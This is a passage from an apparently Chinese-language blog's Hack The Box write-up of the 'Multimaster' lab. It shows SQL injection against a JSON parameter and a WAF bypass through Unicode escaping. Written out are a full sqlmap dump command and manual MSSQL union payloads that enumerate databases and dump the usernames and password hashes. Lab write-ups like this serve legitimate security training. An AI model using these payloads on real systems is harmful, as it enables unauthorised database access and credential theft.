@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="扫端口 Domain: MEGACORP.LOCAL 老规矩先看http的端口，80 80的网页似乎是一个公司的内部日志提醒系统，和静态网页一样。。 好吧，还是有个能传参的地方 起个burp">
+<title>Multimaster</title>
+
+<link rel='canonical' href='https://nergigantes.github.io/htb/multimaster/'>
+
+<link rel="stylesheet" href="/scss/style.min.f720cbcbc8f9265d2875caa41c2c2572405d50fc427ef4375391537c33376c29.css"><meta property='og:title' content="Multimaster">
+<meta property='og:description' content="扫端口 Domain: MEGACORP.LOCAL 老规矩先看http的端口，80 80的网页似乎是一个公司的内部日志提醒系统，和静态网页一样。。 好吧，还是有个能传参的地方 起个burp">
+<meta property='og:url' content='https://nergigantes.github.io/htb/multimaster/'>
+<meta property='og:site_name' content='NergiganteS&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Htb' /><meta property='article:published_time' content='2025-04-06T19:37:34&#43;08:00'/><meta property='article:modified_time' content='2025-04-06T19:38:33&#43;08:00'/>
+<meta name="twitter:title" content="Multimaster">
+<meta name="twitter:description" content="扫端口 Domain: MEGACORP.LOCAL 老规矩先看http的端口，80 80的网页似乎是一个公司的内部日志提醒系统，和静态网页一样。。 好吧，还是有个能传参的地方 起个burp">
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu315a7ad84d8f1f09f998948c005c5c1b_42437_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">NergiganteS&#39;s Blog</a></h1>
+            <h2 class="site-description">分享学习笔记路程</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://nergigantes.github.io/en/" >English</option>
+                                
+                                    <option value="https://nergigantes.github.io/" selected>中文</option>
+                                
+                                    <option value="https://nergigantes.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                Htb
+            </a>
+        
+            <a href="/categories/%E5%9F%9F/" >
+                域
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb/multimaster/">Multimaster</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 06, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>扫端口</p>
+<p><img src="/htb/multimaster/1743750393249-9b3cdbb5-e021-4b65-960c-b1d060800f7f.png"
+	width="1580"
+	height="965"
+	srcset="/htb/multimaster/1743750393249-9b3cdbb5-e021-4b65-960c-b1d060800f7f_hu920f0cb72f9eeef454f2091bff6fc715_342970_480x0_resize_box_3.png 480w, /htb/multimaster/1743750393249-9b3cdbb5-e021-4b65-960c-b1d060800f7f_hu920f0cb72f9eeef454f2091bff6fc715_342970_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="392px"
+	
+></p>
+<p>Domain: MEGACORP.LOCAL</p>
+<p>老规矩先看http的端口，80</p>
+<p>80的网页似乎是一个公司的内部日志提醒系统，和静态网页一样。。</p>
+<p>好吧，还是有个能传参的地方</p>
+<p><img src="/htb/multimaster/1743750864725-c40b84b9-c2d3-487a-a761-7cd97dcebef7.png"
+	width="2448"
+	height="954"
+	srcset="/htb/multimaster/1743750864725-c40b84b9-c2d3-487a-a761-7cd97dcebef7_hu127faf4214116ef6d27db06b753e2dc8_177228_480x0_resize_box_3.png 480w, /htb/multimaster/1743750864725-c40b84b9-c2d3-487a-a761-7cd97dcebef7_hu127faf4214116ef6d27db06b753e2dc8_177228_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="615px"
+	
+></p>
+<p>起个burp详细观察一下</p>
+<p><img src="/htb/multimaster/1743765778697-294cf28b-c34b-42ee-bd4d-b26a038b9526.png"
+	width="1002"
+	height="578"
+	srcset="/htb/multimaster/1743765778697-294cf28b-c34b-42ee-bd4d-b26a038b9526_hub611cbc798d3131f37a4be89def5f25f_72390_480x0_resize_box_3.png 480w, /htb/multimaster/1743765778697-294cf28b-c34b-42ee-bd4d-b26a038b9526_hub611cbc798d3131f37a4be89def5f25f_72390_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="416px"
+	
+></p>
+<p>传递名字的参数是正常的，当我参数改为1的时候</p>
+<p><img src="/htb/multimaster/1743765813236-7ab75648-3a21-4045-a84b-46aa7a3850a8.png"
+	width="1047"
+	height="402"
+	srcset="/htb/multimaster/1743765813236-7ab75648-3a21-4045-a84b-46aa7a3850a8_hua9dcdb0edf1fa5eeebfca326532e353d_44101_480x0_resize_box_3.png 480w, /htb/multimaster/1743765813236-7ab75648-3a21-4045-a84b-46aa7a3850a8_hua9dcdb0edf1fa5eeebfca326532e353d_44101_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="625px"
+	
+></p>
+<p>有框无信息返回,当我们传递**&rsquo;**试图闭合语句的时候。返回403</p>
+<p><img src="/htb/multimaster/1743765912886-a1de9c53-f363-4e6d-9c4b-0ce51dbe38c1.png"
+	width="1240"
+	height="295"
+	srcset="/htb/multimaster/1743765912886-a1de9c53-f363-4e6d-9c4b-0ce51dbe38c1_hu5b2dd0f50ac1986f6866e654de931406_41702_480x0_resize_box_3.png 480w, /htb/multimaster/1743765912886-a1de9c53-f363-4e6d-9c4b-0ce51dbe38c1_hu5b2dd0f50ac1986f6866e654de931406_41702_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="420"
+		data-flex-basis="1008px"
+	
+></p>
+<p>这说明可能存在sql注入只是被waf拦截了</p>
+<p>尝试%27试图绕过waf</p>
+<p><img src="/htb/multimaster/1743765979058-0c61286e-e47c-41c0-a216-31a1b604bd3b.png"
+	width="877"
+	height="305"
+	srcset="/htb/multimaster/1743765979058-0c61286e-e47c-41c0-a216-31a1b604bd3b_huda7d04c5bef4c08d7307ccaa31dcae9e_13555_480x0_resize_box_3.png 480w, /htb/multimaster/1743765979058-0c61286e-e47c-41c0-a216-31a1b604bd3b_huda7d04c5bef4c08d7307ccaa31dcae9e_13555_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="287"
+		data-flex-basis="690px"
+	
+></p>
+<p>与刚开始1的情况一样，这不应该，出现这样的情况可能就是%27被当作1这样的数字解析了，而没有达成我们想要的&rsquo;去闭合语句</p>
+<p>经查发现，我们在json语句里，想要url编码，是要这样的Unicode的表示如**\uxxxx，<strong>其中</strong>X**表示我们要的东西的十六进制值</p>
+<p><img src="/htb/multimaster/1743766131782-10324d22-db08-46c6-a9be-d90f56d724ec.png"
+	width="1053"
+	height="464"
+	srcset="/htb/multimaster/1743766131782-10324d22-db08-46c6-a9be-d90f56d724ec_hu87f1bdabda5a512b4e0e86bb55016db9_50032_480x0_resize_box_3.png 480w, /htb/multimaster/1743766131782-10324d22-db08-46c6-a9be-d90f56d724ec_hu87f1bdabda5a512b4e0e86bb55016db9_50032_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="544px"
+	
+></p>
+<p>很明显，这里确实存在sql注入的点，让我们交给sqlmap跑一下吧</p>
+<p>把这个包保存为文件形式进行sqlmap测试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqlmap -r sql.txt --tamper=charunicodeescape --level 5 --risk 3 --dbms=mssql --batch --delay 4 --exclude-sysdbs --dump-all  
+</span></span><span class="line"><span class="cl">--tamper=charunicodeescape url编码绕过waf
+</span></span><span class="line"><span class="cl">--level 5 --risk 3 测试程度拉满
+</span></span><span class="line"><span class="cl">--dbms=mssql 指定数据库的类型
+</span></span><span class="line"><span class="cl">--batch 全默认
+</span></span><span class="line"><span class="cl">--delay 4 有waf设定一个4秒扫一次的
+</span></span><span class="line"><span class="cl">--exclude-sysdbs 排除系统数据库的信息
+</span></span><span class="line"><span class="cl">--dump-all  显示所有信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跑了一天多还没跑出来。？？</p>
+<p>手工注入也是全是null返回？？</p>
+<p>服了，原来是我的vpn掉了</p>
+<p><img src="/htb/multimaster/1743842216298-06d72dc2-1bc9-459f-ad63-bcd7194edfcf.png"
+	width="1937"
+	height="422"
+	srcset="/htb/multimaster/1743842216298-06d72dc2-1bc9-459f-ad63-bcd7194edfcf_hu53ea0a9181d0692e13e4247af1ba6f32_164430_480x0_resize_box_3.png 480w, /htb/multimaster/1743842216298-06d72dc2-1bc9-459f-ad63-bcd7194edfcf_hu53ea0a9181d0692e13e4247af1ba6f32_164430_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="459"
+		data-flex-basis="1101px"
+	
+></p>
+<p>我说手工注入半天全是返回null,还重置了环境</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; or &#39;1&#39;=&#39;1&#39;-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u006F\u0072\u0020\u0027\u0031\u0027\u003D\u0027\u0031\u0027\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很好，吃个饭的功夫环境又不行了，还得重置，鉴于环境的不稳定，还是老老实实手工注入吧</p>
+<p><img src="/htb/multimaster/1743851443796-baef6bc5-2724-4782-a836-84309de4b944.png"
+	width="1198"
+	height="476"
+	srcset="/htb/multimaster/1743851443796-baef6bc5-2724-4782-a836-84309de4b944_hua9bd7e31380dbbedec76949ddfd1c3f1_49051_480x0_resize_box_3.png 480w, /htb/multimaster/1743851443796-baef6bc5-2724-4782-a836-84309de4b944_hua9bd7e31380dbbedec76949ddfd1c3f1_49051_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="604px"
+	
+></p>
+<p>有效，判断一下列数</p>
+<p><img src="/htb/multimaster/1743852046391-f1e20a03-7a00-4bdf-b8da-ef861b39f756.png"
+	width="1269"
+	height="613"
+	srcset="/htb/multimaster/1743852046391-f1e20a03-7a00-4bdf-b8da-ef861b39f756_hu184c7248ea973c4102ff7be88fda9101_51946_480x0_resize_box_3.png 480w, /htb/multimaster/1743852046391-f1e20a03-7a00-4bdf-b8da-ef861b39f756_hu184c7248ea973c4102ff7be88fda9101_51946_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="496px"
+	
+></p>
+<p>很无语，这环境是咋了，又不行了啊,换个节点试试（服了）</p>
+<p><img src="/htb/multimaster/1743852927477-47ceba00-8892-457f-a6b1-f36a1f37b3e2.png"
+	width="1285"
+	height="525"
+	srcset="/htb/multimaster/1743852927477-47ceba00-8892-457f-a6b1-f36a1f37b3e2_huf5925a3268ad590773334288ac977e32_56750_480x0_resize_box_3.png 480w, /htb/multimaster/1743852927477-47ceba00-8892-457f-a6b1-f36a1f37b3e2_huf5925a3268ad590773334288ac977e32_56750_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="587px"
+	
+></p>
+<p>6列的时候返回null，说明只有5列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; order by 6-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u006F\u0072\u0064\u0065\u0072\u0020\u0062\u0079\u0020\u0036\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; union select 1,2,3,4,5-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0031\u002C\u0032\u002C\u0033\u002C\u0034\u002C\u0035\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>确实是这样的</p>
+<p><img src="/htb/multimaster/1743853040870-588f56ca-672e-42ea-8de1-d91e3c202228.png"
+	width="1489"
+	height="777"
+	srcset="/htb/multimaster/1743853040870-588f56ca-672e-42ea-8de1-d91e3c202228_huf9a5c7ef49b7c8ba0b21da80cda7acba_120938_480x0_resize_box_3.png 480w, /htb/multimaster/1743853040870-588f56ca-672e-42ea-8de1-d91e3c202228_huf9a5c7ef49b7c8ba0b21da80cda7acba_120938_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="459px"
+	
+></p>
+<p>现在看一看数据库名称</p>
+<p>1&rsquo; union select 1,2,3,4,databases()&ndash; -搞错了，这是sql server</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; UNION SELECT 1,2,3,4,DB_NAME()-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0032\u002C\u0033\u002C\u0034\u002C\u0044\u0042\u005F\u004E\u0041\u004D\u0045\u0028\u0029\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/multimaster/1743853316759-656e8d69-761f-4f92-975d-a7e15b657b9d.png"
+	width="1203"
+	height="582"
+	srcset="/htb/multimaster/1743853316759-656e8d69-761f-4f92-975d-a7e15b657b9d_hucfd006c16e38edec9bd8a1be6ce5e558_61302_480x0_resize_box_3.png 480w, /htb/multimaster/1743853316759-656e8d69-761f-4f92-975d-a7e15b657b9d_hucfd006c16e38edec9bd8a1be6ce5e558_61302_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="496px"
+	
+></p>
+<p>获取所有的数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; UNION SELECT 1,2,3,4,name FROM master..sysdatabases-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0032\u002C\u0033\u002C\u0034\u002C\u006E\u0061\u006D\u0065\u0020\u0046\u0052\u004F\u004D\u0020\u006D\u0061\u0073\u0074\u0065\u0072\u002E\u002E\u0073\u0079\u0073\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0073\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/multimaster/1743853584169-bf2c0160-7e82-4bf0-9a67-7ef73e79bf93.png"
+	width="1105"
+	height="528"
+	srcset="/htb/multimaster/1743853584169-bf2c0160-7e82-4bf0-9a67-7ef73e79bf93_hu134551f7fae07a69c7269c9ad8c3d02a_61979_480x0_resize_box_3.png 480w, /htb/multimaster/1743853584169-bf2c0160-7e82-4bf0-9a67-7ef73e79bf93_hu134551f7fae07a69c7269c9ad8c3d02a_61979_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="502px"
+	
+></p>
+<p>现在来查看所有表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; UNION SELECT 1,2,3,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0032\u002C\u0033\u002C\u0054\u0041\u0042\u004C\u0045\u005F\u004E\u0041\u004D\u0045\u002C\u0043\u004F\u004C\u0055\u004D\u004E\u005F\u004E\u0041\u004D\u0045\u0020\u0046\u0052\u004F\u004D\u0020\u0049\u004E\u0046\u004F\u0052\u004D\u0041\u0054\u0049\u004F\u004E\u005F\u0053\u0043\u0048\u0045\u004D\u0041\u002E\u0043\u004F\u004C\u0055\u004D\u004E\u0053\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有用户名和密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">1&#39; UNION SELECT 1,2,3,username,password FROM Logins-- -
+</span></span><span class="line"><span class="cl">\u0031\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0032\u002C\u0033\u002C\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u002C\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0020\u0046\u0052\u004F\u004D\u0020\u004C\u006F\u0067\u0069\u006E\u0073\u002D\u002D\u0020\u002D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/multimaster/1743853844031-fd2e01fc-0f75-4743-afbb-8033de6c926b.png"
+	width="1272"
+	height="616"
+	srcset="/htb/multimaster/1743853844031-fd2e01fc-0f75-4743-afbb-8033de6c926b_hu5010f0417769e212d2c93988bcbb52a5_83474_480x0_resize_box_3.png 480w, /htb/multimaster/1743853844031-fd2e01fc-0f75-4743-afbb-8033de6c926b_hu5010f0417769e212d2c93988bcbb52a5_83474_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="495px"
+	
+></p>
+<p>现在我们有了17个用户的账户和hash，总的来说就4个Hash</p>
+<p>都爆破一下</p>
+<p><img src="/htb/multimaster/1743854103750-06c3491f-91a6-44ac-9257-ed463b65ba87.png"
+	width="1217"
+	height="126"
